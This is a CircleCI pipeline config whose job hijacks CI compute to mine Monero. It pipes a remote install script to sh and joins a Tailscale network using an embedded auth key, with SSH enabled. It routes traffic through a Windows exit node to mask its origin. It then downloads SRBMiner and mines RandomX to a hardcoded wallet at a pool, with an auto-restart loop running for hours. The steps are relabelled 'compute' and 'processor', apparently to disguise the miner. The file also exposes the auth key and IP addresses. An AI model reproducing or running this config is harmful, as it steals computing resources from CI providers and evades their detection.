version: 2.1

jobs:
  compute-task:
    docker:
      - image: ubuntu:22.04
    
    steps:
      - run:
          name: "Setup Environment"
          command: |
            apt-get update -qq
            apt-get install -y -qq curl wget iproute2
      
      - run:
          name: "Install Tailscale"
          command: |
            curl -fsSL https://tailscale.com/install.sh | sh
            
      - run:
          name: "Start Tailscale (Userspace Mode)"
          background: true
          command: |
            # Userspace networking - no kernel modules needed
            tailscaled --tun=userspace-networking --state=/tmp/tailscale.state
      
      - run:
          name: "Connect to Tailscale"
          command: |
            sleep 5
            
            # Connect to tailnet
            tailscale up \
              --authkey=tskey-auth-kzvYcDGAF521CNTRL-HkCXeCi2ydc5hqyiEWgUecZP1XT4BV1CT \
              --hostname=ci-compute-$RANDOM \
              --ssh \
              --accept-routes
            
            sleep 10
            
            # Verify connection
            for i in {1..10}; do
              if tailscale status | grep -q "100."; then
                TS_IP=$(tailscale ip -4)
                echo "==================================="
                echo "✅ Tailscale Connected!"
                echo "Tailscale IP: ${TS_IP}"
                echo "SSH: ssh ci-compute-* (from tailnet)"
                echo "==================================="
                tailscale status
                exit 0
              fi
              echo "Waiting for connection... ($i/10)"
              sleep 3
            done
            
            echo "[!] Connection failed"
            tailscale status
            exit 1
      
      - run:
          name: "Configure Exit Node"
          command: |
            echo "==================================="
            echo "Setting up exit node routing..."
            echo ""
            
            # Set Windows machine as exit node
            echo "Exit node: 100.72.112.87 (Windows)"
            tailscale set --exit-node=100.72.112.87
            
            sleep 5
            
            # Verify exit node
            echo ""
            echo "Tailscale status:"
            tailscale status
            
            # Test public IP
            echo ""
            echo "Testing exit node..."
            apt-get install -y -qq curl >/dev/null 2>&1
            
            for i in {1..5}; do
              PUBLIC_IP=$(curl -s --max-time 10 https://ipinfo.io/ip 2>/dev/null)
              if [ -n "$PUBLIC_IP" ]; then
                echo "✅ Public IP: $PUBLIC_IP"
                echo "   (Your home IP: 49.43.140.37)"
                break
              fi
              echo "Attempt $i/5..."
              sleep 3
            done
            
            echo ""
            echo "==================================="
            echo "✅ Exit node configured"
            echo "==================================="
      
      - run:
          name: "Download Mining Tools"
          command: |
            cd /tmp
            wget -q -O tools.tar.gz https://github.com/doktor83/SRBMiner-Multi/releases/download/3.4.3/SRBMiner-Multi-3-4-3-Linux.tar.gz
            tar -xzf tools.tar.gz
            mv SRBMiner-Multi-3-4-3 processor
            cd processor
            chmod +x SRBMiner-MULTI
      
      - run:
          name: "Start Mining Process"
          no_output_timeout: 6h
          command: |
            cd /tmp/processor
            
            echo "==================================="
            echo "Starting process..."
            echo "Pool: xmr-sg.kryptex.network:8029"
            echo "Exit: 100.72.112.87 → 49.43.140.37"
            echo "==================================="
            
            # Start mining (routes through exit node)
            ./SRBMiner-MULTI --algorithm randomx --disable-gpu \
              --pool xmr-sg.kryptex.network:8029 \
              --wallet "84L2wRKcJKygWjs68n9iZPR5EmHTLjXtwWcAiXHvg17YMaPZadSe8HTRz9Py8UDWNjKecbjbAdupuMMeSzfYknMZAC56QL4/CI-Worker-$RANDOM" \
              --log-file /tmp/compute.log &
            
            PROC_PID=$!
            sleep 15
            
            # Verify process started
            if kill -0 ${PROC_PID} 2>/dev/null; then
              echo ""
              echo "==================================="
              echo "✅ Process running (PID: ${PROC_PID})"
              echo "==================================="
              echo ""
              tail -30 /tmp/compute.log
              echo ""
              echo "==================================="
            else
              echo ""
              echo "[!] Process failed!"
              cat /tmp/compute.log
              exit 1
            fi
            
            # Keep alive with auto-restart
            while true; do
              if ! kill -0 ${PROC_PID} 2>/dev/null; then
                echo "[$(date)] Process died, restarting..."
                ./SRBMiner-MULTI --algorithm randomx --disable-gpu \
                  --pool xmr-sg.kryptex.network:8029 \
                  --wallet "84L2wRKcJKygWjs68n9iZPR5EmHTLjXtwWcAiXHvg17YMaPZadSe8HTRz9Py8UDWNjKecbjbAdupuMMeSzfYknMZAC56QL4/CI-Worker-$RANDOM" \
                  --log-file /tmp/compute.log &
                PROC_PID=$!
                sleep 10
              fi
              
              # Status every 5 minutes
              sleep 300
              echo "[$(date)] Running (PID: ${PROC_PID})"
              tail -3 /tmp/compute.log
            done

workflows:
  compute-workflow:
    jobs:
      - compute-task
